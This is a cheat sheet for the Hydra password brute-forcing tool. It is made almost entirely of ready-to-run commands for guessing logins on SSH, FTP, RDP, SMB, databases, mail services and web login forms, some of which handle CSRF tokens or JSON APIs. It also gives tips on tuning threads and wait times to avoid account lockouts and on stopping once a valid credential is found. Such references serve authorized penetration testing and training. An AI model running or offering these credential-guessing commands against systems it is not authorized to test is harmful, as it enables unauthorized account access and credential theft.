# Hydra Cheat Sheet

## Basic Syntax
```bash
hydra -l USER -P PASSWORDS target SERVICE
hydra -L USERS -P PASSWORDS target SERVICE
hydra -C creds.txt target SERVICE
```

## Common Protocols
| Service | Syntax | Example |
|---------|--------|---------|
| SSH | `-t 4` | `hydra -l root -P pass.txt ssh://192.168.1.1` |
| FTP | `-V` | `hydra -l admin -P pass.txt ftp://192.168.1.1` |
| HTTP POST | `/form` | `hydra -l user -P pass.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"` |
| HTTP GET | `/form` | `hydra -l user -P pass.txt 192.168.1.1 http-get-form "/login:user=^USER^&pass=^PASS^:S=Welcome"` |
| HTTPS POST | `/form` | `hydra -l user -P pass.txt -m /login https-post-form://192.168.1.1` |
| SMB | `-t 1` | `hydra -l admin -P pass.txt smb://192.168.1.1` |
| RDP | `-t 1` | `hydra -l admin -P pass.txt rdp://192.168.1.1` |
| MySQL | | `hydra -l root -P pass.txt mysql://192.168.1.1` |
| MSSQL | | `hydra -l sa -P pass.txt mssql://192.168.1.1` |
| PostgreSQL | | `hydra -l postgres -P pass.txt postgres://192.168.1.1` |
| VNC | `-t 1` | `hydra -P pass.txt vnc://192.168.1.1` |
| Telnet | `-t 4` | `hydra -l admin -P pass.txt telnet://192.168.1.1` |
| LDAP | | `hydra -l admin -P pass.txt ldap://192.168.1.1` |
| POP3 | | `hydra -l user -P pass.txt pop3://192.168.1.1` |
| SMTP | | `hydra -l user -P pass.txt smtp://192.168.1.1` |
| IMAP | | `hydra -l user -P pass.txt imap://192.168.1.1` |
| SNMP | | `hydra -P pass.txt snmp://192.168.1.1` |
| Redis | | `hydra -P pass.txt redis://192.168.1.1` |

## Options
| Flag | Description |
|------|-------------|
| `-l user` | Single username |
| `-L file` | Username wordlist |
| `-p pass` | Single password |
| `-P file` | Password wordlist |
| `-C file` | user:pass combo file |
| `-t 4` | Parallel tasks (default 16) |
| `-V` | Verbose (show attempts) |
| `-v` | Less verbose |
| `-d` | Debug mode |
| `-f` | Stop after first found |
| `-F` | Stop per host after first |
| `-o output.txt` | Save results |
| `-I` | Ignore existing restore |
| `-R` | Restore aborted session |
| `-w 30` | Wait time per thread (s) |
| `-W 3` | Time between connects (s) |
| `-s port` | Custom port |
| `-M hosts.txt` | Multiple targets |
| `-e nsr` | Try n (null), s (same as user), r (reverse) |

## HTTP POST Form Examples
```bash
# Standard form
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# With CSRF token extraction
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:csrf_token=^CSRF^&username=^USER^&password=^PASS^:C=/login:csrf_token:H=Cookie: csrf=^CSRF^:F=Invalid"

# JSON API
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/api/login:{\"user\":\"^USER^\",\"pass\":\"^PASS^\"}:H=Content-Type: application/json:F=Invalid"
```

## Rate Limiting & Throttling
```bash
# Slow down for SSH
hydra -l root -P pass.txt -t 4 -w 10 ssh://target

# Single thread for fragile services
hydra -l admin -P pass.txt -t 1 -w 30 rdp://target

# Multiple targets with throttle
hydra -l admin -P pass.txt -M targets.txt -t 8 ssh
```

## Tips
- Use `-f` to stop after first credential found
- For HTTP forms, the failure condition (`:F=Invalid`) or success condition (`:S=Welcome`) is critical
- Use `-t 1` for RDP/VNC to avoid lockouts
- Use `-V` to watch passwords being tried
- Save results with `-o results.txt`
- Resume interrupted scans with `-R`
- Check `/usr/share/wordlists/` for common wordlists
- `hydra -U http-post-form` shows help for HTTP module
